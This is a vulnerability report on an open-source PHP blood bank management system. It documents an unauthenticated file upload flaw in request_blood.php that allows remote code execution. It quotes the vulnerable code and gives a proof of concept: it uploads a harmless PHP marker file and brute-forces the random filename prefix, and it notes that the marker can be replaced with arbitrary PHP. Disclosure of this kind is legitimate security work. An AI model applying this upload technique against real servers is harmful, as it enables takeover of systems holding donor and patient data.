## BLOODBANK MANAGING SYSTEM IN PHP has an arbitrary file upload leading to RCE vulnerability in request_blood.php

## supplier 

https://code-projects.org/bloodbank-managing-system-in-php-with-source-code/

## Vulnerability file

`request_blood.php:39-46`

`request_blood.php:54-55`

## describe

The public page `request_blood.php` allows anonymous users to upload files, but the server does not check the extension, MIME type, or file content, nor does it isolate the upload directory for execution.

The key vulnerable code is as follows:

**Code analysis**    

```
if(isset($_POST["submit"]))
{
    $target_dir = "request_image/";
    $file_name=$_FILES["PIC"]["name"];
    if($file_name!="")
    {
        $target_file = $target_dir.rand(100,999). basename($_FILES["PIC"]["name"]);
        move_uploaded_file($_FILES["PIC"]["tmp_name"], $target_file);
    }
```

Vulnerable source statement:

```
$target_file = $target_dir.rand(100,999). basename($_FILES["PIC"]["name"]);
move_uploaded_file($_FILES["PIC"]["tmp_name"], $target_file);
```

There are three issues:

1. There is no server-side suffix check.
2. There is no server-side content check.
3. The upload directory `request_image/` can be accessed directly via the web, allowing uploaded `.php` files to be executed directly.

In addition, the file upload occurs before the database write, so even if subsequent insertion fails, the malicious file will remain on the server.

## POC

Upload payload:

```
<?php echo "CODEX_RCE_20260418"; ?>
```

Send a `multipart/form-data` request to `request_blood.php` as an anonymous user to upload the file named:

```
auditcodex20260418.php
```

Because a three-digit prefix is randomly added before the file name, the access verification is then performed within the `100-999` range, ultimately hitting:

```
http://192.168.10.104/blood/request_image/635auditcodex20260418.php
```

Actual response:

![image-20260418145042998](https://img.hzysec.top/image-20260418145042998.png)

This indicates that the uploaded PHP file has been parsed and executed by the server, rather than being downloaded as a static file.

## Exploit

Verified payload use:

```
<?php echo "CODEX_RCE_20260418"; ?>
```

In actual use, an attacker can replace this payload with any PHP code to gain remote code execution capability. In the current report, a safe marker string was used to demonstrate that code execution is possible, and destructive testing was not further carried out.